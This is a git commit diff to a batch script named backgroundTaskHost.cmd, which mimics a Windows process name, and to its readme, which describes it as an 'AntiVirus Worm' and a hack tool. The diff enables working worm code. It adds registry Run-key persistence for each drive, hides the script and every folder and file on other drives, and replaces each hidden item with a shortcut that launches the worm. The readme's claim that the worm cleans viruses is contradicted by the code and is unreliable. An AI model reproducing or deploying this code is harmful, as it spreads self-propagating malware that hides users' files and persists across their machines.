b1282425242b97aed7497f3993b2b957b09784a0
BuildTools <unwarned@unknown.spigot.mc>
2019-02-21 22:16:10 +0200

    #9 Fixed some bugs
    - updated readme
    - fixed some bugs
    - updated compiler settings

--- backgroundTaskHost.cmd
+++ backgroundTaskHost.cmd
@@ -6,72 +6,77 @@
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF65
-::cxAkpRVqdFKZSDk=
+::cxAkpRVqdFKZSTk=
 ::cBs/ulQjdF65
-::ZR41oxFsdFKZSDk=
+::ZR41oxFsdFKZSTk=
 ::eBoioBt6dFKZSDk=
 ::cRo6pxp7LAbNWATEpSI=
 ::egkzugNsPRvcWATEpSI=
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
-::YxY4rhs+aU+JeA==
-::cxY6rQJ7JhzQF1fEqQJQ
-::ZQ05rAF9IBncCkqN+0xwdVs0
-::ZQ05rAF9IAHYFVzEqQJQ
-::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJheFUEAlXVbTjuSOR8
+::ZQ05rAF9IBncCkqN+0xwdVsFHErScjrtV+ZIprmb
+::ZQ05rAF9IAHYFVzEqQIdIRhGQxeNOn8YyPUr4eb/4P2UAINde/I6ao7P07qJYNMK+VHhePY=
+::eg0/rx1wNQPfEVWB+kM9LVsJDAaDP2C9FLoJ5uzP7vmMikIOQKw6YIq7
 ::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
-::cRolqwZ3JBvQF1fEqQJQ
+::cRolqwZ3JBvQF1fEqQISKRhfSxaNKWW+RoEd++O7x+WUti0=
 ::dhA7uBVwLU+EWDk=
 ::YQ03rBFzNR3SWATElA==
-::dhAmsQZ3MwfNWATElA==
+::dhAmsQZ3MwfNWATEVosdIRhGQxeNOn/6JboO+Ofp7v6OrUNTFMMzdM/J07OGNPNT+ED3cIQ70346
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
 ::Zh4grVQjdCuDJAnXugIGJBpQDC2UPWW1EIlMvqa7wP6Pp18hZPAwcorYzqeyG8ca/m3xd9Yf02pVi8IYAwlRewGWUg01qmVFpGuQOcOoshzqYkea8gU1A2BIhWLThywpb8ZmnvcCwCuW817r0aAI1Bg=
-::YB416Ek+ZG8=
+::YB416Ek+ZW8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
 chcp 65001>nul
+
 title backgroundTaskHost.exe [MikronT]
 
 
 
-if "%runKey%" == "already_runned" exit
-set runKey=already_runned
 
-echo.%*
-pause
-if "%*" NEQ "" start "%*" explorer "%*"
+
+set key_target=
+for /f "tokens=1,* delims=- " %%i in ("%*") do set %%i
+if "%key_target%" NEQ "" start "%key_target%" explorer "%key_target%"
+
+if "%key_running%" == "1" exit
+set key_running=1
+
+rem echo.%*
+rem pause>nul
+
+
 
 
 
 :cycle
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host" /d "%SystemDrive%\%~nx0" /f
-
 for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
-      rem attrib +s +h "%%i:\%~nx0"
+      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
+      attrib +s +h "%%i:\%~nx0"
 
       if "%%i:" NEQ "%SystemDrive%" if "%%i" NEQ "D" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
           if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
-            rem attrib +h "%%i:\%%x"
+            attrib +h "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
-              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
-              rem timeout /nobreak /t 1 >nul
+              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0 --key_target=%%i:\%%x" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
             )
           )
         )
 
         for /f "delims=" %%x in ('dir "%%i:\*" /a:-d /b 2^>nul') do (
           if "%%x" NEQ "desktop.ini" if "%%x" NEQ "pagefile.sys" if "%%x" NEQ "Thumbs.db" (
-            rem attrib +h "%%i:\%%x"
+            attrib +h "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
-              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
-              rem timeout /nobreak /t 1 >nul
+              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0 --key_target=%%i:\%%x" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
             )
           )
         )
@@ -88,8 +93,6 @@ goto :cycle
 
 
 rem powershell $shortcut = ^(New-Object -comObject Wscript.Shell^).CreateShortcut^('%%i:\%%x.lnk'^); $shortcut.TargetPath = '%%i:\%%x'; $shortcut.Save^(^)
-
-
 
 rem tasklist | find /i "%~nx0">>nul || goto :cycle
 rem exit
--- readme.md
+++ readme.md
@@ -1,5 +1,8 @@
 # backgroundTaskHost.exe - AntiVirus Worm
-Virus worm that can clean your computer from other viruses and garbage
-## Batch Experiment
+*Batch Experiment*
+
+Virus worm that can clean your computer from other viruses and garbage.
 
 **This repository contains the souce code of a hack tool I developed using spare time. I never use this to harm any personal computer. I just develop this to kill time and improve my programming skill :)**
+
+*For compilation used Bat To Exe Converter*
